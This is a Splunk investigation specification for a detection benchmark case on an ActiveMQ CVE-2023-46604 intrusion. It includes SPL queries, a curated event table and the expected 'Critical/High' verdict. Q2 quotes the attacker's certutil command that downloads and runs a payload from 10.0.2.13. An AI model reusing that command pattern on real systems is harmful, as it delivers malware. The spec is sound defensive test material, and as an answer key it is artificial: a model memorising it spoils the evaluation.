# AMQ-001 — Splunk retrieval specification

Category: ActiveMQ RCE → foothold (T1190 Exploit Public-Facing App; CVE-2023-46604) · **Tier-2, MULTI-sensor
(Sysmon + Security)** · Split: dev.
Evidence condition: **strong** · Calibration role: **preserve** (confirmed critical intrusion — hold High).

## Source scope
- `.../apt_simulations/ActiveMQ_exploit_Lockbit_Ransomware/windows-sysmon.log`
- `.../apt_simulations/ActiveMQ_exploit_Lockbit_Ransomware/windows-security.log`

Both scoped to Computer **`EC2AMAZ-I41BETP`** (the exploited host). This is a *genuine* fusion case: the two
sensors are co-hosted and each carries evidence the other lacks.

## Step 0 — Stage and ingest
```
cp .../windows-sysmon.log   _splunk_ingest/amq001_sysmon.log
cp .../windows-security.log _splunk_ingest/amq001_security.log
```
Ingest each → `sourcetype=XmlWinEventLog`, `index=attack_data`, sources `amq001_sysmon.log` /
`amq001_security.log`, `TZ=UTC`.

Confirm that both sources are present before running the case queries:
```spl
index=attack_data source="*amq001*"
| stats count min(_time) AS first_event max(_time) AS last_event BY source Computer sourcetype
```

---

## Investigation

## Q1 — The alert (A0, Sysmon): ActiveMQ's Java spawns a shell
```spl
index=attack_data source="amq001_sysmon.log" Computer="EC2AMAZ-I41BETP*" EventCode=1
  ParentImage="*\\java*" Image="*\\cmd.exe"
| table _time EventRecordID CommandLine ParentImage
```
**A0 = sysmon:7134** — `cmd.exe /c "certutil …"` spawned by ActiveMQ's `java`. A Java broker spawning
`cmd` is the CVE-2023-46604 RCE signature.

## Q2 — What does it run? (Sysmon has the command line)
`cmd → certutil -urlcache -f http://10.0.2.13:8080/… %TEMP%\qSwUwejx.exe` (sysmon:7135) → the payload is
written to Temp (sysmon:7136) and **executed** (sysmon:7137).

## Q3 — Outbound payload connection (Sysmon network)
```spl
index=attack_data source="amq001_sysmon.log" Computer="EC2AMAZ-I41BETP*" EventCode=3 DestinationIp="10.0.2.13"
```
→ **sysmon:7144** — `qSwUwejx.exe → 10.0.2.13:4444`. This is a C2-like outbound channel,
but the port number alone does not prove a reverse shell or confirmed C2.

## Q4 — The Security view (fusion): audit trail + identity that Sysmon lacks
```spl
index=attack_data source="amq001_security.log" Computer="EC2AMAZ-I41BETP*" EventCode=4688
  NewProcessName IN ("*cmd.exe","*certutil.exe","*qSwUwejx.exe")
| table _time EventRecordID NewProcessName ParentProcessName SubjectUserName
```
→ security:325120/325122/325123 independently corroborate the `java→cmd→certutil/qSwUwejx` tree **and reveal it
runs as `Administrator`**. Security's command-line auditing is off, so it has no URLs or payload arguments.
Sysmon is already strongly incriminating; Security adds independent process-tree and identity corroboration.

## Q5 — Follow-on: remote-access tooling
`certutil` then downloads **AnyDesk** (sysmon:7182 → `anydesk.exe`, sysmon:7183; audited at security:325162) —
hands-on-keyboard remote access, the pre-ransomware staging.

## Q6 — Strong / preserve crux
An ActiveMQ Java process spawns a shell, downloads and runs a payload, and the payload opens an outbound
connection and spawns a child shell as Administrator before AnyDesk is downloaded. The process, file, network,
and cross-sensor identity evidence establishes a multi-sensor-corroborated **critical intrusion foothold**
without treating port 4444 alone as proof of C2. Correct verdict = **Critical/High**. The calibration test is *preserve*: a
model must hold this High and not discount it — and must not be defeated by the split evidence (the smoking-gun
command line is only in Sysmon; the Administrator identity only in Security).

---

## Curation record
| Key | Sensor | Event | Why in the case |
|-----|--------|-------|-----------------|
| **sysmon:7134** | Sysmon | `java → cmd /c certutil …` | **A0** — ActiveMQ RCE |
| sysmon:7135 | Sysmon | `cmd → certutil` download from 10.0.2.13:8080 | the payload fetch (URL) |
| sysmon:7136 | Sysmon | file-create `…\Temp\qSwUwejx.exe` | payload on disk |
| sysmon:7137 | Sysmon | `cmd → qSwUwejx.exe` | payload executes |
| sysmon:7144 | Sysmon | net `qSwUwejx.exe → 10.0.2.13:4444` | outbound C2-like connection; not port-only proof of C2 |
| sysmon:7171 | Sysmon | high-integrity `cmd.exe` whose parent PID matches `qSwUwejx.exe` | payload-linked child shell |
| sysmon:7182 | Sysmon | `cmd → certutil …AnyDesk.exe` | remote-access download |
| sysmon:7183 | Sysmon | file-create `…\Temp\anydesk.exe` | AnyDesk on disk |
| security:325120 | Security | 4688 `cmd ⇐ java` (Administrator) | audited tree + identity |
| security:325122 | Security | 4688 `certutil ⇐ cmd` | audit corroboration |
| security:325123 | Security | 4688 `qSwUwejx ⇐ cmd` | payload exec (audited) |
| security:325150 | Security | 4688 `cmd ⇐ qSwUwejx` (Administrator) | payload-linked shell corroboration |
| security:325162 | Security | 4688 `certutil ⇐ cmd` (AnyDesk) | audit corroboration |

## Export
```spl
index=attack_data Computer="EC2AMAZ-I41BETP*"
(
  (source="amq001_sysmon.log" EventRecordID IN (7134,7135,7136,7137,7144,7171,7182,7183))
  OR
  (source="amq001_security.log" EventRecordID IN (325120,325122,325123,325150,325162))
)
| dedup source EventRecordID
| sort 0 _time
| table _time source EventRecordID _raw
```
Export (All Time) → **JSON** → `extracted/amq001_events.json`. (The engine tags each event's sensor from its
provider, so one combined file is fine.)

## Normalize

Run from the project root:

```bash
python3 tools/normalize.py --case tier2/strong/dev/AMQ-001_activemq_rce_foothold --from-log
python3 tools/normalize.py --case tier2/strong/dev/AMQ-001_activemq_rce_foothold --verify-log
```

The first command rebuilds the package from the retained raw source. The second re-derives it and byte-compares it with `model_input/alert_package.json`.
